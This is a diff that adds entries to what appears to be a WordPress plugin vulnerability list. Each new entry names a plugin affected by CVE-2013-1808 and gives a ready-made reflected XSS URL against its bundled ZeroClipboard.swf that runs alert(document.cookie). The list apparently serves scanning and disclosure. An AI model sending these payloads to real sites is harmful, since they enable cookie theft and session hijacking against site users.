@@ -18,3 +18,18 @@
 # CVE-2014-XXXX cforms2 14.8 http://seclists.org/bugtraq/2014/Dec/172
 # CVE-2014-XXXX frontend-uploader N/A (2014-12-29) http://seclists.org/fulldisclosure/2014/Dec/122 CVE requested by SECUPENT Research Center <research@secupent.com>
 # CVE-2014-XXXX wp-members http://seclists.org/fulldisclosure/2014/Jan/29
+# CVE-2013-1808 wp-link-to-us wp-content/plugins/wp-link-to-us/js/ZeroClipboard.swf?id=\%22%29%29}catch%28e%29{}if%28!self.a%29self.a=!alert%28document.cookie%29//&width&height wp-content/plugins/wp-link-to-us/js/ZeroClipboard10.swf?id=\%22%29%29}catch%28e%29{}if%28!self.a%29self.a=!alert%28document.cookie%29//&width&height
+# CVE-2013-1808 zopim-live-chat wp-content/plugins/zopim-live-chat/ZeroClipboard.swf?id=\%22%29%29}catch%28e%29{}if%28!self.a%29self.a=!alert%28document.cookie%29//&width&height
+# CVE-2013-1808 wppygments wp-content/plugins/wppygments/js/ZeroClipboard.swf?id=\%22%29%29}catch%28e%29{}if%28!self.a%29self.a=!alert%28document.cookie%29//&width&height wp-content/plugins/wppygments/js/ZeroClipboard10.swf?id=\%22%29%29}catch%28e%29{}if%28!self.a%29self.a=!alert%28document.cookie%29//&width&height
+# CVE-2013-1808 wp-clone-by-wp-academy wp-content/plugins/wp-clone-by-wp-academy/lib/js/ZeroClipboard.swf?id=\%22%29%29}catch%28e%29{}if%28!self.a%29self.a=!alert%28document.cookie%29//&width&height http://www.openwall.com/lists/oss-security/2013/03/26/8
+# CVE-2013-1808 tiny-url wp-content/plugins/tiny-url/swf/ZeroClipboard10.swf?id=\"))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//&width&height http://www.openwall.com/lists/oss-security/2013/03/26/8
+# CVE-2013-1808 thethe-layout-grid wp-content/plugins/thethe-layout-grid/style/admin/js/ZeroClipboard.swf?id=\"))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//&width&height
+# CVE-2013-1808 slidedeck2 wp-content/plugins/slidedeck2/js/zeroclipboard/ZeroClipboard.swf?id=\"))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//&width&height wp-content/plugins/slidedeck2/js/zeroclipboard/ZeroClipboard10.swf?id=\"))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//&width&height fixed http://www.openwall.com/lists/oss-security/2013/03/14/11
+# CVE-2013-1808 paypal-digital-goods-monetization-powered-by-cleeng wp-content/plugins/paypal-digital-goods-monetization-powered-by-cleeng/js/ZeroClipboard.swf?id=\"))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//&width&height http://www.openwall.com/lists/oss-security/2013/03/26/8
+# CVE-2013-1808 mobileview wp-content/plugins/mobileview/admin/js/ZeroClipboard.swf?id=\"))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//&width&height
+# CVE-2013-1808 jaspreetchahals-coupons-lite wp-content/plugins/jaspreetchahals-coupons-lite/js/ZeroClipboard.swf?id=\"))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//&width&height
+# CVE-2013-1808 geshi-source-colorer wp-content/plugins/geshi-source-colorer/external/zeroclipboard/ZeroClipboard.swf?id=\"))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//&width&height
+# CVE-2013-1808 click-to-copy-grab-box wp-content/plugins/click-to-copy-grab-box/lib/ZeroClipboard.swf?id=\"))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//&width&height
+# CVE-2013-1808 cleeng wp-content/plugins/cleeng/js/ZeroClipboard.swf?id=\"))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//&width&height http://www.openwall.com/lists/oss-security/2013/03/26/8
+# CVE-2013-1808 buckets wp-content/plugins/buckets/js/ZeroClipboard.swf?id=\"))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//&width&height
+# CVE-2013-1808 bp-code-snippets wp-content/plugins/bp-code-snippets/js/ZeroClipboard.swf?id=\"))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//&width&height http://www.openwall.com/lists/oss-security/2013/03/26/8
